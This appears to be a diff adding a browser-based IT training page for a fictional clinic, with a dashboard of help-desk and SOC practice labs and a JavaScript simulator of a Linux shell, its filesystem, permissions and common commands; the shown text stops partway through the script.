@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0b1020">
+<title>Westside Family Clinic IT Labs</title>
+<style>
+:root{--bg:#0b1020;--panel:#121a2e;--panel2:#18223b;--line:#26324f;--text:#e6ebf5;--muted:#95a2bf;--accent:#4fd1c5;--hd:#60a5fa;--soc:#f87171;--ok:#34d399;--warn:#fbbf24;--bad:#fb7185;--term:#070b14}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--bg);color:var(--text);font:15px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;-webkit-text-size-adjust:100%}
+button{font:inherit;cursor:pointer}
+.wrap{max-width:1180px;margin:0 auto;padding:16px}
+header.top{border-bottom:1px solid var(--line);background:linear-gradient(180deg,#111a31,#0b1020)}
+.brand{display:flex;gap:12px;align-items:center}
+.logo{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--hd));color:#04121a;font-weight:800;display:grid;place-items:center;flex:none;font-size:14px}
+h1{font-size:20px;margin:0}
+h2{font-size:18px;margin:0}
+h3{font-size:15px;margin:0 0 6px}
+.sub{margin:2px 0 0;color:var(--muted);font-size:13px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px}
+.progress{display:flex;flex-wrap:wrap;gap:14px;align-items:center;justify-content:space-between;margin:16px 0}
+.bar{height:10px;background:var(--panel2);border-radius:99px;overflow:hidden;min-width:180px;flex:1}
+.bar>i{display:block;height:100%;background:linear-gradient(90deg,var(--accent),var(--ok));width:0;transition:width .4s}
+.badges{display:flex;gap:6px;flex-wrap:wrap}
+.bdg{width:30px;height:30px;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:700;background:var(--panel2);color:var(--muted);border:1px solid var(--line)}
+.bdg.on{background:var(--ok);color:#052e1f;border-color:var(--ok)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
+.ticket{text-align:left;color:var(--text);background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px;display:flex;flex-direction:column;gap:8px;transition:border-color .15s,transform .15s}
+.ticket:hover,.ticket:focus-visible{border-color:var(--accent);transform:translateY(-2px);outline:none}
+.trow{display:flex;justify-content:space-between;gap:8px;align-items:center;font-size:12px;color:var(--muted)}
+.tag{font-size:11px;font-weight:700;padding:2px 8px;border-radius:99px;letter-spacing:.3px}
+.tag.hd{background:rgba(96,165,250,.15);color:var(--hd)}
+.tag.soc{background:rgba(248,113,113,.15);color:var(--soc)}
+.tag.p1{background:rgba(251,113,133,.15);color:var(--bad)}
+.tag.p2{background:rgba(251,191,36,.15);color:var(--warn)}
+.tag.p3{background:rgba(149,162,191,.15);color:var(--muted)}
+.ticket .tt{font-weight:650;font-size:15px}
+.ticket .ts{color:var(--muted);font-size:13px}
+.status{font-size:12px;font-weight:700}
+.status.done{color:var(--ok)}
+.status.todo{color:var(--muted)}
+.resume{margin-top:16px}
+.resume ul{margin:8px 0 0;padding-left:18px}
+.resume li{margin:4px 0}
+.muted{color:var(--muted)}
+.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:10px;padding:8px 14px}
+.btn:hover{border-color:var(--accent)}
+.btn.pri{background:var(--accent);color:#04121a;border-color:var(--accent);font-weight:700}
+.btn.small{padding:5px 10px;font-size:13px}
+.labbar{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+.labbar .tid{color:var(--muted);font-size:12px}
+.labgrid{display:grid;grid-template-columns:minmax(0,5fr) minmax(0,7fr);gap:14px;align-items:start}
+.actions{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
+.panel{min-height:120px}
+.panel p{margin:6px 0}
+.panel ul{margin:6px 0;padding-left:18px}
+.panel code,.done code{background:var(--panel2);padding:1px 5px;border-radius:5px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px}
+.msg-ok{border-left:4px solid var(--ok);padding-left:10px}
+.msg-bad{border-left:4px solid var(--bad);padding-left:10px}
+.msg-hint{border-left:4px solid var(--warn);padding-left:10px}
+.pass{color:var(--ok);font-weight:800;font-size:18px}
+.fail{color:var(--bad);font-weight:800;font-size:18px}
+.term{background:var(--term);border:1px solid var(--line);border-radius:14px;overflow:hidden;display:flex;flex-direction:column;height:min(70vh,620px)}
+.thead{display:flex;align-items:center;gap:6px;padding:8px 12px;background:#0e1424;border-bottom:1px solid var(--line);font-size:12px;color:var(--muted)}
+.dot{width:10px;height:10px;border-radius:50%;background:#394766}
+.out{flex:1;overflow:auto;padding:10px 12px;font:13.5px/1.45 ui-monospace,Menlo,Consolas,"Liberation Mono",monospace;white-space:pre-wrap;word-break:break-word;color:#d7e0f0}
+.out .e{color:#fca5a5}
+.out .i{color:var(--accent)}
+.out .c{color:#fff}
+.inrow{display:flex;align-items:center;gap:6px;padding:8px 12px;border-top:1px solid var(--line);background:#0a0f1c}
+.prompt{font:13.5px ui-monospace,Menlo,Consolas,monospace;color:var(--ok);white-space:nowrap;max-width:45%;overflow:hidden;text-overflow:ellipsis}
+.inrow input{flex:1;min-width:0;background:transparent;border:0;outline:none;color:#fff;font:16px ui-monospace,Menlo,Consolas,monospace;caret-color:var(--accent)}
+.keys{display:flex;gap:6px;padding:6px 12px 10px;background:#0a0f1c;overflow-x:auto}
+.keys button{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:4px 10px;font-size:13px;white-space:nowrap}
+.answer label{display:block;font-size:13px;color:var(--muted);margin-top:8px}
+.answer input,.answer select{width:100%;margin-top:4px;background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:8px;font-size:16px}
+.done{margin-top:14px;border-color:var(--ok)}
+.done .big{font-size:40px;line-height:1}
+.resline{background:var(--panel2);border-radius:10px;padding:10px;margin:8px 0;font-style:italic}
+.modal{position:fixed;inset:0;background:rgba(3,6,14,.8);display:grid;place-items:center;padding:12px;z-index:50}
+.modal[hidden]{display:none}
+.mbox{width:min(760px,100%);background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:12px;display:flex;flex-direction:column;gap:10px}
+.mbox textarea{width:100%;height:min(55vh,420px);background:var(--term);color:#e6ebf5;border:1px solid var(--line);border-radius:10px;padding:10px;font:14px/1.45 ui-monospace,Menlo,Consolas,monospace;resize:vertical}
+.mbtns{display:flex;gap:8px;justify-content:flex-end}
+[hidden]{display:none!important}
+footer{color:var(--muted);font-size:12px;text-align:center;padding:24px 16px}
+@media (max-width:860px){.labgrid{grid-template-columns:1fr}.term{height:62vh}}
+@media (max-width:480px){.inrow{flex-wrap:wrap;row-gap:2px}.inrow input{flex-basis:100%}.prompt{max-width:100%!important}.out{font-size:12px!important}.wrap{padding:12px}h1{font-size:17px}.actions{gap:6px}.actions .btn{padding:8px 4px;font-size:14px}.out{font-size:12.5px}.prompt{font-size:12.5px;max-width:40%}}
+</style>
+</head>
+<body>
+<header class="top"><div class="wrap brand"><div class="logo">WFC</div><div><h1>Westside Family Clinic IT Labs</h1><p class="sub">Help desk and SOC ticket practice for Ricardo Castrejon</p></div></div></header>
+<main class="wrap">
+<section id="dash">
+  <div class="card progress">
+    <div><h3 id="progText">0 of 8 labs complete</h3><div class="badges" id="badges"></div></div>
+    <div class="bar" aria-hidden="true"><i id="progBar"></i></div>
+  </div>
+  <p class="muted" style="margin:0 0 12px">Each ticket opens a simulated Linux terminal with its own users, files, services and logs. Nothing here touches a real system, so experiment freely. Type <code>help</code> in any terminal.</p>
+  <div class="grid" id="grid"></div>
+  <div class="card resume" id="resumeCard">
+    <h3>Resume lines you have earned</h3>
+    <p class="muted" id="resumeEmpty">Complete a lab to unlock an honest, specific resume bullet.</p>
+    <ul id="resumeList"></ul>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px"><button class="btn small" id="copyResume" hidden>Copy all lines</button><button class="btn small" id="resetAll">Reset all progress</button></div>
+  </div>
+</section>
+<section id="lab" hidden>
+  <div class="labbar">
+    <button class="btn" id="backBtn">Dashboard</button>
+    <div><div class="tid" id="labTid"></div><h2 id="labTitle"></h2></div>
+  </div>
+  <div class="labgrid">
+    <div>
+      <div class="actions">
+        <button class="btn" id="bBrief">Briefing</button>
+        <button class="btn" id="bHint">Hint</button>
+        <button class="btn pri" id="bCheck">Check</button>
+        <button class="btn" id="bReset">Reset</button>
+      </div>
+      <div class="card panel" id="panel" aria-live="polite"></div>
+      <div class="card answer" id="answer" hidden style="margin-top:12px">
+        <h3>Incident answer form</h3>
+        <label for="ansIp">Attacker IP address</label><input id="ansIp" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="e.g. 192.0.2.10">
+        <label for="ansUser">Targeted account</label><input id="ansUser" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="username">
+        <label for="ansOk">Did the attacker log in successfully?</label>
+        <select id="ansOk"><option value="">Choose one</option><option value="yes">Yes, a login succeeded</option><option value="no">No, every attempt failed</option></select>
+        <p class="muted" style="font-size:12px;margin:8px 0 0">Press Check when you are ready. Your answers are graded with the rest of the lab.</p>
+      </div>
+    </div>
+    <div class="term" id="term">
+      <div class="thead"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span id="termTitle" style="margin-left:6px">terminal</span></div>
+      <div class="out" id="out" role="log" tabindex="0"></div>
+      <div class="inrow"><span class="prompt" id="prompt"></span><input id="cmd" type="text" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" enterkeyhint="send" aria-label="Terminal command"></div>
+      <div class="keys" id="keys"><button data-k="up">History up</button><button data-k="down">History down</button><button data-k="tab">Tab</button><button data-k="sudo">sudo</button><button data-k="pipe">|</button><button data-k="clear">clear</button></div>
+    </div>
+  </div>
+  <div class="card done" id="done" hidden></div>
+</section>
+</main>
+<div class="modal" id="modal" hidden><div class="mbox" role="dialog" aria-modal="true" aria-labelledby="mTitle">
+  <h3 id="mTitle">Editing <span id="mFile"></span></h3>
+  <textarea id="mText" spellcheck="false" autocapitalize="off" autocorrect="off"></textarea>
+  <div class="mbtns"><button class="btn" id="mCancel">Cancel</button><button class="btn pri" id="mSave">Save</button></div>
+</div></div>
+<footer>Westside Family Clinic is fictional. All systems, people and IP addresses are simulated for practice.</footer>
+<script>
+"use strict";
+/* ===== Virtual Linux core: filesystem, users, parsing ===== */
+const GB=1024*1024*1024, MB=1024*1024, KB=1024;
+const DATE='Sep 27 09:14';
+function clone(o){return JSON.parse(JSON.stringify(o));}
+function normPath(cwd,p,home){
+  if(p===undefined||p==='')return cwd;
+  if(p==='~'||p.startsWith('~/'))p=(home||'/root')+p.slice(1);
+  const parts=(p.startsWith('/')?p:cwd+'/'+p).split('/');const out=[];
+  for(const s of parts){if(!s||s==='.')continue;if(s==='..')out.pop();else out.push(s);}
+  return '/'+out.join('/');
+}
+function parentOf(p){if(p==='/')return '/';const i=p.lastIndexOf('/');return i<=0?'/':p.slice(0,i);}
+function baseName(p){return p==='/'?'/':p.slice(p.lastIndexOf('/')+1);}
+function node(S,p){return S.fs[p];}
+function children(S,p){const pre=p==='/'?'/':p+'/';const r=[];for(const k in S.fs){if(k!==p&&k.startsWith(pre)&&k.slice(pre.length).indexOf('/')<0)r.push(k.slice(pre.length));}return r.sort();}
+function descendants(S,p){const pre=p==='/'?'/':p+'/';return Object.keys(S.fs).filter(k=>k.startsWith(pre)&&k!==p).sort();}
+function fsize(n){return n.t==='f'?(n.sz!=null?n.sz:n.c.length):4096;}
+function mkf(S,p,c,o){o=o||{};S.fs[p]={t:'f',o:o.o||'root',g:o.g||o.o||'root',m:o.m!=null?o.m:0o644,c:c||''};if(o.sz!=null)S.fs[p].sz=o.sz;}
+function mkd(S,p,o){o=o||{};S.fs[p]={t:'d',o:o.o||'root',g:o.g||o.o||'root',m:o.m!=null?o.m:0o755};}
+function human(b){if(b<1024)return b+(b?'B':'');const u=['K','M','G','T'];let i=-1;do{b/=1024;i++;}while(b>=1024&&i<3);return (b<10?(Math.round(b*10)/10):Math.round(b))+u[i];}
+function modeStr(n){const m=n.m;const t=n.t==='d'?'d':'-';const r=(b,x)=>((m>>b)&4?'r':'-')+((m>>b)&2?'w':'-')+x;
+  const ux=(m&0o100)?'x':'-';let gx=(m&0o10)?'x':'-';if(m&0o2000)gx=(m&0o10)?'s':'S';let ox=(m&1)?'x':'-';if(m&0o1000)ox=(m&1)?'t':'T';
+  return t+r(6,ux)+r(3,gx)+r(0,ox);}
+function octal(m){return (m&0o7777).toString(8).padStart(3,'0');}
+/* users and groups */
+function userGroups(S,u){if(u==='root')return ['root'];const U=S.users[u];if(!U)return [];return [U.pg||u].concat(U.groups.filter(g=>g!==(U.pg||u)));}
+function gid(S,g){return S.groups[g]!=null?S.groups[g]:'?';}
+function syncEtc(S){
+  const pw=[],gr=[];
+  for(const u in S.users){const U=S.users[u];pw.push(u+':x:'+U.uid+':'+gid(S,U.pg||u)+':'+(U.gecos||'')+':'+(U.home||'/home/'+u)+':'+(U.shell||'/bin/bash'));}
+  for(const g in S.groups){const mem=Object.keys(S.users).filter(u=>S.users[u].groups.includes(g)&&(S.users[u].pg||u)!==g);gr.push(g+':x:'+S.groups[g]+':'+mem.join(','));}
+  if(S.fs['/etc/passwd'])S.fs['/etc/passwd'].c=pw.join('\n')+'\n';
+  if(S.fs['/etc/group'])S.fs['/etc/group'].c=gr.join('\n')+'\n';
+}
+/* permissions */
+function bits(S,user,n){if(user==='root')return 7;if(n.o===user)return (n.m>>6)&7;if(userGroups(S,user).includes(n.g))return (n.m>>3)&7;return n.m&7;}
+function canTraverse(S,user,p){if(user==='root')return true;let cur=parentOf(p);const chain=[];while(true){chain.unshift(cur);if(cur==='/')break;cur=parentOf(cur);}
+  for(const d of chain){const n=S.fs[d];if(!n)return false;if(!(bits(S,user,n)&1))return false;}return true;}
+function can(S,user,p,want){/* want: 4 r, 2 w, 1 x */const n=S.fs[p];if(!n)return false;if(!canTraverse(S,user,p))return false;return (bits(S,user,n)&want)===want;}
+function canCreate(S,user,p){const par=parentOf(p);return !!S.fs[par]&&can(S,user,par,3);}
+/* glob */
+function globRe(pat,full){let r='';for(const ch of pat){if(ch==='*')r+=full?'.*':'[^/]*';else if(ch==='?')r+='.';else r+=ch.replace(/[.+^${}()|[\]\\]/g,'\\$&');}return new RegExp('^'+r+'$');}
+function expandGlob(S,tok){
+  const slash=tok.lastIndexOf('/');const dirPart=slash>=0?tok.slice(0,slash+1):'';const pat=slash>=0?tok.slice(slash+1):tok;
+  if(/[*?]/.test(dirPart))return [tok];
+  const dir=normPath(S.cwd,dirPart||'.',homeOf(S,curUser(S)));
+  if(!S.fs[dir]||S.fs[dir].t!=='d')return [tok];
+  const re=globRe(pat);const m=children(S,dir).filter(n=>re.test(n)&&(pat.startsWith('.')||!n.startsWith('.')));
+  return m.length?m.map(n=>dirPart+n):[tok];
+}
+function curUser(S){return S.asRoot?'root':S.me;}
+function homeOf(S,u){return u==='root'?'/root':((S.users[u]&&S.users[u].home)||'/home/'+u);}
+/* tokenizer */
+function tokenize(line){
+  const t=[];let cur='',q=false,inTok=false,i=0;
+  const push=()=>{if(inTok){t.push({v:cur,q:q});cur='';q=false;inTok=false;}};
+  while(i<line.length){const ch=line[i],two=line.slice(i,i+2);
+    if(ch==="'"||ch==='"'){const e=line.indexOf(ch,i+1);if(e<0){cur+=line.slice(i+1);i=line.length;}else{cur+=line.slice(i+1,e);i=e+1;}q=true;inTok=true;continue;}
+    if(ch==='\\'&&i+1<line.length){cur+=line[i+1];i+=2;inTok=true;continue;}
+    if(/\s/.test(ch)){push();i++;continue;}
+    if(!inTok&&line.slice(i,i+4)==='2>&1'){t.push({op:'2>&1'});i+=4;continue;}
+    if(!inTok&&two==='2>'){t.push({op:'2>'});i+=2;continue;}
+    if(two==='&&'||two==='||'||two==='>>'){push();t.push({op:two});i+=2;continue;}
+    if(ch==='|'||ch==='>'||ch===';'){push();t.push({op:ch});i++;continue;}
+    cur+=ch;inTok=true;i++;}
+  push();return t;
+}
+/* ===== Interpreter ===== */
+const CMDS={};
+function pa(args,valued){valued=valued||[];const f=new Set(),v={},pos=[];
+  for(let i=0;i<args.length;i++){const x=args[i];
+    if(x==='--'){pos.push(...args.slice(i+1));break;}
+    if(x.startsWith('--')&&x.length>2){const k=x.slice(2).split('=')[0],val=x.includes('=')?x.slice(x.indexOf('=')+1):undefined;if(val!==undefined)v[k]=val;else if(valued.includes(k))v[k]=args[++i];else f.add(k);continue;}
+    if(x.startsWith('-')&&x.length>1&&!/^-\d+$/.test(x)){for(let j=1;j<x.length;j++){const c=x[j];if(valued.includes(c)){v[c]=j<x.length-1?x.slice(j+1):args[++i];break;}f.add(c);}continue;}
+    pos.push(x);}
+  return {f,v,pos};}
+function P(c,p){return normPath(c.S.cwd,p,homeOf(c.S,curUser(c.S)));}
+function J(p,x){return p==='/'?'/'+x:p+'/'+x;}
+function tip(c,msg){if(!c.tipped){c.info.push(msg||(c.sudo&&c.user!=='root'?'(This ran as '+c.user+' through sudo -u, and '+c.user+' does not have this access.)':'Tip: this needs admin rights. Put sudo in front of the command.'));c.tipped=true;}}
+function denied(c,msg){c.err.push(msg);if(c.user!=='root')tip(c);return 1;}
+function needRoot(c,name){if(c.user==='root')return false;c.err.push(name+': Permission denied.');tip(c);return true;}
+function readText(c,arg,cmd){const p=P(c,arg),n=node(c.S,p);
+  if(!n){c.err.push(cmd+': '+arg+': No such file or directory');return null;}
+  if(n.t==='d'){c.err.push(cmd+': '+arg+': Is a directory');return null;}
+  if(!can(c.S,c.user,p,4)){denied(c,cmd+': '+arg+': Permission denied');return null;}
+  return n.c;}
+function linesOf(t){if(t==null)return [];const a=String(t).split('\n');if(a.length&&a[a.length-1]==='')a.pop();return a;}
+function writeFile(S,user,p,text,append){const n=S.fs[p];
+  if(n&&n.t==='d')return p+': Is a directory';
+  if(n){if(!can(S,user,p,2))return p+': Permission denied';n.c=append?n.c+text:text;delete n.sz;return null;}
+  if(!S.fs[parentOf(p)])return p+': No such file or directory';
+  if(!canCreate(S,user,p))return p+': Permission denied';
+  const U=S.users[user];mkf(S,p,text,{o:user,g:user==='root'?'root':(U&&U.pg)||user,m:0o644});return null;}
+function runLine(S,line){
+  const res={lines:[],clear:false,action:null};
+  const toks=tokenize(line);const chains=[];let cur=[],sep=null;
+  for(const t of toks){if(t.op===';'||t.op==='&&'||t.op==='||'){chains.push({toks:cur,sep});cur=[];sep=t.op;}else cur.push(t);}
+  chains.push({toks:cur,sep});let last=0;
+  for(const ch of chains){if(!ch.toks.length)continue;if(ch.sep==='&&'&&last!==0)continue;if(ch.sep==='||'&&last===0)continue;last=runPipeline(S,ch.toks,res);}
+  syncEtc(S);return res;}
+function noExpand(args){const i=args.indexOf('grep');if(i<0)return false;return args.slice(i+1).filter(x=>!x.startsWith('-')).length===0;}
+function runPipeline(S,toks,res){
+  const stages=[[]];for(const t of toks){if(t.op==='|')stages.push([]);else stages[stages.length-1].push(t);}
+  let input=null,code=0;const after=[];
+  for(let i=0;i<stages.length;i++){const st=stages[i],args=[];let redir=null,quiet=false;
+    for(let j=0;j<st.length;j++){const t=st[j];
+      if(t.op==='>'||t.op==='>>'){const f=st[j+1];if(!f||f.op){res.lines.push(['e',"bash: syntax error near unexpected token 'newline'"]);return 2;}redir={file:f.v,append:t.op==='>>'};j++;continue;}
+      if(t.op==='2>'){const f=st[j+1];if(f&&!f.op){if(f.v==='/dev/null')quiet=true;j++;}continue;}
+      if(t.op)continue;
+      const prev=args[args.length-1];
+      if(!t.q&&/[*?]/.test(t.v)&&prev!=='-name'&&prev!=='-iname'&&!noExpand(args))args.push(...expandGlob(S,t.v));else args.push(t.v);}
+    if(!args.length){input='';continue;}
+    const c={S,args,stdin:input,out:[],err:[],info:[],res,user:curUser(S),sudo:false};
+    try{code=exec(c)||0;}catch(e){c.err.push('simulator error: '+e.message);code=1;}
+    if(!quiet)for(const e of c.err)res.lines.push(['e',e]);
+    for(const m of c.info)after.push(['i',m]);
+    let text=c.out.join('\n');
+    if(redir){const p=normPath(S.cwd,redir.file,homeOf(S,curUser(S)));
+      const e=writeFile(S,curUser(S),p,text+(c.out.length?'\n':''),redir.append);
+      if(e){res.lines.push(['e','bash: '+e]);if(e.endsWith('Permission denied'))res.lines.push(['i',"Tip: the > and >> redirects run as you, not as sudo. Use sudo edit FILE, or pipe into sudo tee -a FILE."]);code=1;}
+      text='';}
+    input=text;}
+  if(input)for(const l of input.split('\n'))res.lines.push(['o',l]);
+  res.lines.push(...after);return code;}
+function exec(c){let a=c.args;
+  if(a[0]==='sudo'){
+    if(a.length===1){c.err.push('usage: sudo COMMAND');return 1;}
+    if(a[1]==='-i'||a[1]==='-s'||(a[1]==='su'&&(a.length===2||a[2]==='-'||a[2]==='root'))){c.S.asRoot=true;c.info.push('You are now root. Type exit to go back to ricardo.');return 0;}
+    if(a[1]==='-u'){const u=a[2];if(u!=='root'&&!c.S.users[u]){c.err.push('sudo: unknown user '+u);return 1;}c.user=u;a=a.slice(3);}else{c.user='root';a=a.slice(1);}
+    c.sudo=true;c.args=a;if(!a.length){c.err.push('usage: sudo COMMAND');return 1;}
+    if(a[0]==='sudo')return exec(c);}
+  const f=CMDS[a[0]];
+  if(!f){c.err.push(a[0]+': command not found');c.info.push("That command isn't in this simulator (or has a typo). Type help to see everything you can use here.");return 127;}
+  return f(c,a.slice(1));}
+/* ----- navigation and files ----- */
+CMDS.pwd=c=>{c.out.push(c.S.cwd);};
+CMDS.cd=(c,a)=>{const t=a[0]||'~';const p=P(c,t),n=node(c.S,p);
+  if(!n){c.err.push('bash: cd: '+t+': No such file or directory');return 1;}
+  if(n.t!=='d'){c.err.push('bash: cd: '+t+': Not a directory');return 1;}
+  if(!can(c.S,curUser(c.S),p,1)){c.err.push('bash: cd: '+t+': Permission denied');tip(c,'Tip: you cannot cd into a folder without execute (x) permission on it. Check it with ls -ld.');return 1;}
+  c.S.cwd=p;};
+function lsLine(n,name,h,w){w=w||{o:8,g:8,s:h?5:10};const sz=h?human(fsize(n)):String(fsize(n));return modeStr(n)+' '+(n.t==='d'?2:1)+' '+n.o.padEnd(w.o)+' '+n.g.padEnd(w.g)+' '+sz.padStart(w.s)+' '+DATE+' '+name;}
+function lsW(nodes,h){const w={o:1,g:1,s:1};nodes.forEach(n=>{w.o=Math.max(w.o,n.o.length);w.g=Math.max(w.g,n.g.length);w.s=Math.max(w.s,(h?human(fsize(n)):String(fsize(n))).length);});return w;}
+CMDS.ls=(c,a)=>{const o=pa(a),L=o.f.has('l'),all=o.f.has('a')||o.f.has('A'),h=o.f.has('h'),d=o.f.has('d');const ts=o.pos.length?o.pos:['.'];let code=0;
+  ts.forEach((t,idx)=>{const p=P(c,t),n=node(c.S,p);
+    if(!n){c.err.push("ls: cannot access '"+t+"': No such file or directory");code=2;return;}
+    if(n.t==='f'||d){if(!canTraverse(c.S,c.user,p)){code=denied(c,"ls: cannot access '"+t+"': Permission denied");return;}c.out.push(L?lsLine(n,t,h,lsW([n],h)):t);return;}
+    if(!can(c.S,c.user,p,5)){code=denied(c,"ls: cannot open directory '"+t+"': Permission denied");return;}
+    if(ts.length>1)c.out.push(t+':');
+    const names=children(c.S,p).filter(x=>all||!x.startsWith('.'));
+    if(L){let tot=0;names.forEach(x=>tot+=Math.ceil(fsize(node(c.S,J(p,x)))/4096)*4);c.out.push('total '+tot);
+      const w=lsW(names.map(x=>node(c.S,J(p,x))).concat(all?[n,node(c.S,parentOf(p))]:[]),h);
+      if(all){c.out.push(lsLine(n,'.',h,w));c.out.push(lsLine(node(c.S,parentOf(p)),'..',h,w));}
+      names.forEach(x=>c.out.push(lsLine(node(c.S,J(p,x)),x,h,w)));}
+    else if(names.length)c.out.push(names.join('  '));
+    if(ts.length>1&&idx<ts.length-1)c.out.push('');});
+  return code;};
+CMDS.ll=(c,a)=>CMDS.ls(c,['-la'].concat(a));
+CMDS.cat=(c,a)=>{const o=pa(a);if(!o.pos.length){c.out.push(...linesOf(c.stdin));return 0;}let code=0;
+  for(const f of o.pos){const t=readText(c,f,'cat');if(t==null){code=1;continue;}c.out.push(...linesOf(t));}return code;};
+function inputLines(c,files,cmd){if(!files.length)return linesOf(c.stdin);const r=[];for(const f of files){const t=readText(c,f,cmd);if(t!=null)r.push(...linesOf(t));}return r;}
+function headTail(c,a,tail){let n=10;const rest=[];let follow=false;
+  for(let i=0;i<a.length;i++){const x=a[i];if(x==='-n'){n=parseInt(a[++i],10);}else if(/^-n\d+$/.test(x))n=parseInt(x.slice(2),10);else if(/^-\d+$/.test(x))n=parseInt(x.slice(1),10);else if(x==='-f'||x==='-F')follow=true;else if(x.startsWith('--lines='))n=parseInt(x.slice(8),10);else rest.push(x);}
+  if(isNaN(n))n=10;const L=inputLines(c,rest,tail?'tail':'head');c.out.push(...(tail?L.slice(Math.max(0,L.length-n)):L.slice(0,n)));
+  if(follow)c.info.push('(tail -f keeps watching a file live on a real system. The simulator shows the current end of the file.)');}
+CMDS.head=(c,a)=>headTail(c,a,false);
+CMDS.tail=(c,a)=>headTail(c,a,true);
+CMDS.grep=(c,a)=>{const o=pa(a,['e','m','A','B','C']);let pat=o.v.e!=null?o.v.e:o.pos.shift();
+  if(pat==null){c.err.push('usage: grep [-i] [-c] [-v] [-n] [-o] [-r] PATTERN [FILE...]');return 2;}
+  const fl=o.f.has('i')?'i':'';let re;try{re=new RegExp(o.f.has('E')?pat:pat.replace(/\\\|/g,'|'),fl);}catch(e){re=new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),fl);}
+  if(o.f.has('w'))re=new RegExp('\\b(?:'+re.source+')\\b',fl);
+  let files=o.pos.slice();
+  if((o.f.has('r')||o.f.has('R'))){const x=[];(files.length?files:['.']).forEach(f=>{const p=P(c,f),n=node(c.S,p);if(n&&n.t==='d')descendants(c.S,p).forEach(k=>{if(c.S.fs[k].t==='f')x.push(k);});else x.push(f);});files=x;}
+  const multi=files.length>1&&!o.f.has('h');let total=0;
+  const src=files.length?files.map(f=>({name:f,t:readText(c,f,'grep')})).filter(x=>x.t!=null):[{name:'(standard input)',t:c.stdin||''}];
+  for(const s of src){const L=linesOf(s.t);let cnt=0;
+    L.forEach((line,i)=>{const hit=re.test(line)!==o.f.has('v');if(!hit)return;cnt++;if(o.f.has('c')||o.f.has('l'))return;
+      const pre=(multi?s.name+':':'')+(o.f.has('n')?(i+1)+':':'');
+      if(o.f.has('o')&&!o.f.has('v')){const g=new RegExp(re.source,fl+'g');let m;while((m=g.exec(line))){c.out.push(pre+m[0]);if(!m[0])g.lastIndex++;}}else c.out.push(pre+line);});
+    if(o.f.has('c'))c.out.push((multi?s.name+':':'')+cnt);else if(o.f.has('l')&&cnt)c.out.push(s.name);total+=cnt;}
+  return total?0:1;};
+CMDS.egrep=(c,a)=>CMDS.grep(c,['-E'].concat(a));
+CMDS.wc=(c,a)=>{const o=pa(a);const L=inputLines(c,o.pos,'wc');const txt=L.join('\n');const w=txt.split(/\s+/).filter(Boolean).length;
+  if(o.f.has('l'))c.out.push(String(L.length));else if(o.f.has('w'))c.out.push(String(w));else if(o.f.has('c'))c.out.push(String(txt.length+(L.length?1:0)));else c.out.push(L.length+' '+w+' '+(txt.length+1));};
+CMDS.sort=(c,a)=>{const o=pa(a,['k','t']);let L=inputLines(c,o.pos,'sort');
+  if(o.f.has('n'))L.sort((x,y)=>(parseFloat(x)||0)-(parseFloat(y)||0));else L.sort();if(o.f.has('r'))L.reverse();if(o.f.has('u'))L=L.filter((x,i)=>L.indexOf(x)===i);c.out.push(...L);};
+CMDS.uniq=(c,a)=>{const o=pa(a);const L=inputLines(c,o.pos,'uniq');const r=[];for(const l of L){if(r.length&&r[r.length-1].l===l)r[r.length-1].n++;else r.push({l,n:1});}
+  r.forEach(x=>c.out.push(o.f.has('c')?String(x.n).padStart(7)+' '+x.l:x.l));};
+CMDS.awk=(c,a)=>{const o=pa(a,['F']);const prog=o.pos.shift()||'';const m=prog.match(/^\s*\{\s*print\s*(.*?)\s*;?\s*\}\s*$/);
+  if(!m){c.err.push("awk: this simulator only supports simple programs like awk '{print $1}' or awk '{print $1, $9}'");return 2;}
+  const parts=m[1].split(/\s*,\s*|\s+/).filter(Boolean);const sep=o.v.F;
+  inputLines(c,o.pos,'awk').forEach(line=>{const f=sep?line.split(sep):line.trim().split(/\s+/);
+    c.out.push(parts.map(x=>{if(x==='$0')return line;if(x==='$NF')return f[f.length-1]||'';const k=x.match(/^\$(\d+)$/);return k?(f[+k[1]-1]||''):x.replace(/^"|"$/g,'');}).join(' '));});};
+CMDS.cut=(c,a)=>{const o=pa(a,['d','f']);const d=o.v.d||'\t';const fs=(o.v.f||'1').split(',').map(Number);
+  inputLines(c,o.pos,'cut').forEach(l=>{const p=l.split(d);c.out.push(fs.map(i=>p[i-1]||'').join(d));});};
+CMDS.echo=(c,a)=>{const x=a.filter((v,i)=>!(i===0&&(v==='-e'||v==='-n')));c.out.push(x.join(' '));};
+CMDS.tee=(c,a)=>{const o=pa(a);const txt=linesOf(c.stdin).join('\n')+'\n';let code=0;
+  for(const f of o.pos){const e=writeFile(c.S,c.user,P(c,f),txt,o.f.has('a'));if(e){c.err.push('tee: '+e);if(c.user!=='root')tip(c);code=1;}}
+  c.out.push(...linesOf(c.stdin));return code;};
+CMDS.touch=(c,a)=>{let code=0;for(const f of a.filter(x=>!x.startsWith('-'))){const p=P(c,f);if(node(c.S,p))continue;const e=writeFile(c.S,c.user,p,'',false);if(e){code=denied(c,"touch: cannot touch '"+f+"': "+e.split(': ').pop());}}return code;};
